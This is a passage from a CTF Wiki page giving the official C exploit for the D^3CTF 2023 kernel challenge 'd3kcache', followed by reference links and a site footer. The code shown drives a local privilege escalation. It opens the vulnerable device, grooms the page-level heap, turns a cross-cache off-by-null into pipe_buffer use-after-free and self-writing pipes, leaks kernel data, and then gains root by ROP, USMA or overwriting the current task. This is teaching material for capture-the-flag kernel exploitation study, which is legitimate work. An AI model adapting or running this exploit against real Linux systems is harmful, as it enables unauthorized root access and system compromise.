<span class=p>}</span>

<span class=kt>void</span><span class=w> </span><span class=nf>exploitation</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>envp</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * Step.O - fundamental works</span>
<span class=cm>     */</span>

<span class=w>    </span><span class=n>save_status</span><span class=p>();</span>

<span class=w>    </span><span class=cm>/* bind core to 0 */</span>
<span class=w>    </span><span class=n>bind_core</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* dev file */</span>
<span class=w>    </span><span class=n>dev_fd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>open</span><span class=p>(</span><span class=s>&quot;/dev/d3kcache&quot;</span><span class=p>,</span><span class=w> </span><span class=n>O_RDWR</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>dev_fd</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to open /dev/d3kcache!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* spray pgv pages */</span>
<span class=w>    </span><span class=n>prepare_pgv_system</span><span class=p>();</span>
<span class=w>    </span><span class=n>prepare_pgv_pages</span><span class=p>();</span>

<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,</span>
<span class=cm>     * making two pipe_buffer pointing to the same pages</span>
<span class=cm>     */</span>
<span class=w>    </span><span class=n>corrupting_first_level_pipe_for_page_uaf</span><span class=p>();</span>

<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * Step.II - re-allocate the victim page to pipe_buffer,</span>
<span class=cm>     * leak page-related address and construct a second-level pipe uaf</span>
<span class=cm>     */</span>
<span class=w>    </span><span class=n>corrupting_second_level_pipe_for_pipe_uaf</span><span class=p>();</span>

<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * Step.III - re-allocate the second-level victim page to pipe_buffer,</span>
<span class=cm>     * construct three self-page-pointing pipe_buffer </span>
<span class=cm>     */</span>
<span class=w>    </span><span class=n>building_self_writing_pipe</span><span class=p>();</span>

<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * Step.IV - leaking fundamental information by pipe</span>
<span class=cm>     */</span>
<span class=w>    </span><span class=n>info_leaking_by_arbitrary_pipe</span><span class=p>();</span>

<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * Step.V - different method of exploitation</span>
<span class=cm>     */</span>

<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=s>&quot;rop&quot;</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=cm>/* traditionally root by rop */</span>
<span class=w>        </span><span class=n>privilege_escalation_by_rop</span><span class=p>();</span>
<span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=s>&quot;cfi&quot;</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=cm>/* extra - check for CFI&#39;s availability */</span>
<span class=w>        </span><span class=n>trigger_control_flow_integrity_detection</span><span class=p>();</span>
<span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=s>&quot;usma&quot;</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>privilege_escalation_by_usma</span><span class=p>();</span>
<span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=cm>/* default: root by seeking init_task and overwrite current */</span>
<span class=w>        </span><span class=n>privilege_escalation_by_task_overwrite</span><span class=p>();</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* we SHOULDN&#39;T get there, so panic :( */</span>
<span class=w>    </span><span class=n>trigger_control_flow_integrity_detection</span><span class=p>();</span>
<span class=p>}</span>

<span class=kt>void</span><span class=w> </span><span class=nf>banner</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;-------- D^3CTF2023::Pwn - d3kcache --------&quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;</span><span class=se>\n</span><span class=s>&quot;</span>
<span class=w>    </span><span class=n>INFO_MSG</span><span class=p>(</span><span class=s>&quot;--------    Official Exploitation   --------</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>)</span>
<span class=w>    </span><span class=n>INFO_MSG</span><span class=p>(</span><span class=s>&quot;--------      Author: &quot;</span><span class=p>)</span><span class=s>&quot;arttnba3&quot;</span><span class=n>INFO_MSG</span><span class=p>(</span><span class=s>&quot;      --------&quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;</span><span class=se>\n</span><span class=s>&quot;</span>
<span class=w>    </span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;-------- Local Privilege Escalation --------</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>));</span>
<span class=p>}</span>

<span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>envp</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=n>banner</span><span class=p>();</span>
<span class=w>    </span><span class=n>exploitation</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=n>envp</span><span class=p>);</span>
<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div> <h2 id=reference>REFERENCE<a class=headerlink href=#reference title="Permanent link">&para;</a></h2> <p><a href=https://github.com/arttnba3/D3CTF2023_d3kcache>[D^3CTF 2023] d3kcache: From null-byte cross-cache overflow to infinite arbitrary read &amp; write in physical memory space.</a></p> <p><a href=https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/ >【PWN.0x02】Linux Kernel Pwn II：常用结构体集合</a></p> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../cross-cache-uaf/ class="md-footer__link md-footer__link--prev" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> Cross-Cache UAF </div> </div> </a> <a href=../../../race/double-fetch/ class="md-footer__link md-footer__link--next" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> Double Fetch </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2016 - 2023 CTF Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> </div> </div> </footer> </div> <script src=../../../../../../../assets/javascripts/vendor.191088e8.min.js></script> <script src=../../../../../../../assets/javascripts/bundle.d4cf0930.min.js></script><script id=__lang type=application/json>{"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing"}</script> <script>
        app = initialize({
          base: "../../../../../../..",
          features: ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"],
          search: Object.assign({
            worker: "../../../../../../../assets/javascripts/worker/search.e77c40e2.min.js"
          }, typeof search !== "undefined" && search),
          version: {}
        })
      </script> <script src=https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js></script> <script src=https://ctf-wiki.org/static/js/extra.js></script> <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script> </body> </html>